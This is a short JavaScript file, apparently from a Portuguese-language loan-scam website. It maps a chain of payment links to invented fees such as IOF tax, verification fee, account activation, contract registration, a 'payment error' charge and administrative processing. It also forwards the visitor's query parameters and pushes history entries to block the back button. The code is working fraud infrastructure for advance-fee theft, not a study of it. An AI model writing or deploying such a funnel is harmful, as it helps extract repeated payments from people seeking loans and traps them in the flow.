const baseLinks = {
    up1: "https://pay.acesso-facilitado.shop/65XDZBqdPD13VJw", // IOF
    up2: "https://pay.acesso-facilitado.shop/NDr8gmKjNVqZBmj", // Taxa de verificação de IOF
    up3: "https://pay.acesso-facilitado.shop/n1NLgwJNBmYGMxE", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.acesso-facilitado.shop/N1nVZpYWNxAGlM6", // NFe
    up5: "https://pay.acesso-facilitado.shop/xQBPZvRABDaZmVq", // Ativar conta
    up6: "https://pay.acesso-facilitado.shop/eApQgz25B92gEb7", // Taxa de registro do contrato
    up7: "https://pay.acesso-facilitado.shop/ODAK3LlNwMv3E6V", // Parabéns, 20k adicional
    up8: "https://pay.acesso-facilitado.shop/2wq7Gr7dNkpgBAN", // Erro no pagamento - 14,06
    up9: "https://pay.acesso-facilitado.shop/6YQPgjn6MjLgpxz", // APP - 11,99
    up10:"https://pay.acesso-facilitado.shop/521rZJz1wNwZeaX", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.acesso-facilitado.shop/P5LNZ8zyRX2gaRy", // Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.acesso-facilitado.shop/JqoR32b41w03Vj5" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);

